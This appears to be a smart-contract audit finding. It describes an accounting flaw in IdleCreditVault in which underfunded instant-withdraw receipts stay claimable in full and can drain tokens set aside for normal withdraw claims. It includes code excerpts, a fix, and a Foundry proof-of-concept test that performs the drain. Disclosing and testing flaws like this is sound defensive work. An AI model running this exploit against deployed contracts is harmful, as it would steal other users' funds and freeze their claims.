### Title
Unfunded instant-withdraw receipts can drain underlyings earmarked for normal withdraw claims - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

The external bug class is "the writer trusts the caller-provided output size and writes past the funded buffer." The analog lives in `IdleCreditVault.claimInstantWithdrawRequest`: it pays out the full recorded `instantWithdrawsRequests[_user]` against whatever underlying balance the vault happens to hold, without checking how much of that request was actually funded by `collectInstantWithdrawFunds`. When `startEpoch` under-funds instant requests (`pendingInstant > totUnderlyings`), the unfunded receipts stay fully claimable, so their holders can sweep underlyings that a later `stopEpoch` deposited for normal withdraw receipts.

### Finding Description

At `startEpoch`, `IdleCDOEpochVariant` sends only `min(pendingInstant, totUnderlyings)` to the strategy via `collectInstantWithdrawFunds`:

```solidity
// contracts/IdleCDOEpochVariant.sol:279-289
uint256 pendingInstant = _pendingInstant();
uint256 totUnderlyings = _contractTokenBalance(token);
_strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);
if (pendingInstant > totUnderlyings) {
  _startEpochProgrammableBorrower(_pendingWithdraws);
  return;
}
```

`collectInstantWithdrawFunds` only decrements `pendingInstantWithdraws`; it does not reduce any per-user receipt:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol:398-403
pendingInstantWithdraws -= _amount;
underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
```

So the portion of each `instantWithdrawsRequests[_user]` above the funded amount remains recorded at full value. The claim path has no funding check and no epoch gating:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol:387-392
uint256 amount = instantWithdrawsRequests[_user];
_burn(_user, amount);
instantWithdrawsRequests[_user] = 0;
_transferFundedClaim(_user, amount);
```

`_transferFundedClaim` only guards `defaultRecoveryReserve`; it does not distinguish underlyings collected for instant receipts from underlyings collected for normal withdraw receipts via `collectWithdrawFunds` (which `safeTransferFrom`s `_pendingWithdraws` into this same contract at `stopEpoch`).

```solidity
// contracts/strategies/idle/IdleCreditVault.sol:899-906
uint256 reserve = defaultRecoveryReserve;
if (reserve != 0) {
  uint256 balance = underlyingToken.balanceOf(address(this));
  if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
}
underlyingToken.safeTransfer(_user, _amount);
```

### Impact Explanation

The vault is a single shared output buffer: funds pulled at `stopEpoch` for normal receipts and funds pulled at `startEpoch` for instant receipts are commingled, but claims are denominated by per-user request counters, not by funded balances. An attacker holding an unfunded instant receipt can wait until `stopEpoch` deposits `_pendingWithdraws` into the vault, then call `IdleCDOEpochVariant.claimInstantWithdrawRequest()` and withdraw tokens earmarked for normal receipt holders. Those normal claimants' `claimWithdrawRequest` calls then revert on insufficient balance — a first-come-first-served overrun that converts an underfunded instant receipt into theft of other users' funded claims (up to the full unfunded instant amount), and permanently freezes the displaced normal claims until new money arrives.

### Likelihood Explanation

Requires only an unprivileged tranche holder: deposit, request instant withdraw during a running epoch when `allowInstantWithdraw`/APR conditions trigger instant requests, then have the next `startEpoch` fire while `pendingInstant > totUnderlyings` (common when most liquidity is lent out — which is the normal state of a credit vault mid-epoch). The attacker simply waits for the following `stopEpoch` to fund the vault, then claims before the normal receipt holders. No privileged cooperation is needed; honest manager calls supply the funding. Guard analysis: `_transferFundedClaim`'s reserve check does not cover non-default receipts, `claimInstantWithdrawRequest` has no funded-amount bookkeeping, and nothing reduces `instantWithdrawsRequests` when `collectInstantWithdrawFunds` under-funds.

### Recommendation

Track the funded portion of instant withdrawals. Either (a) in `collectInstantWithdrawFunds`, record a per-epoch `instantFundedAmount` and haircut claims pro rata when funding was partial (mirroring `lossRecoveryPriceByEpoch` for normal receipts), or (b) at `startEpoch`, when `pendingInstant > totUnderlyings`, roll the unfunded remainder into a separate pending bucket that can only be paid by future explicitly-collected funds rather than the vault's general balance. At minimum, `_transferFundedClaim` should enforce `balance - amount >= pendingWithdraws - alreadyFundedNormal` so instant claims cannot spend the normal-receipt buffer.

### Proof of Concept

Foundry fork PoC (against `test/foundry/IdleCreditVault.t.sol` harness):

```solidity
function testPocUnfundedInstantClaimDrainsNormalReceipts() external {
  _useStandardEpochVariant();
  // honest LP deposits and requests a normal withdraw
  address lp = makeAddr('lp');
  uint256 lpTranches = _depositWithUser(lp, 100e6);

  // attacker deposits small, will request instant withdraw
  address atk = makeAddr('atk');
  uint256 atkTranches = _depositWithUser(atk, 50e6);

  // enable instant withdraws, start epoch -> almost all liquidity goes to borrower
  vm.prank(manager);
  cdoEpoch.setInstantWithdrawParams(100, 1e18, false);
  vm.prank(manager);
  cdoEpoch.startEpoch();

  // lp requests normal withdraw; attacker requests instant withdraw
  _requestWithdrawWithUser(lp, lpTranches);
  vm.prank(atk);
  cdoEpoch.requestInstantWithdraw(atkTranches); // vault has ~0 idle -> unfunded

  // buffer: next startEpoch sends min(pendingInstant, totUnderlyings)=~0,
  // attacker's instant receipt stays fully recorded but unfunded.
  // next stopEpoch pulls _pendingWithdraws (lp's receipt) into the vault.
  _stopCurrentEpochWithApr(0);

  // attacker claims FIRST: sweeps underlyings funded for lp's normal receipt
  uint256 balPre = underlying.balanceOf(atk);
  vm.prank(atk);
  cdoEpoch.claimInstantWithdrawRequest();
  assertGt(underlying.balanceOf(atk) - balPre, 0, 'attacker paid from lp-funded buffer');

  // lp's funded claim now reverts / pays less — funds frozen
  vm.prank(lp);
  vm.expectRevert();
  cdoEpoch.claimWithdrawRequest();
}
```

Key assertion to tighten in a full PoC: `strategy.balanceOf` funded for normal receipts equals `pendingWithdraws` collected at `stopEpoch`, and the attacker's payout exceeds `collectInstantWithdrawFunds`' actual funded amount.
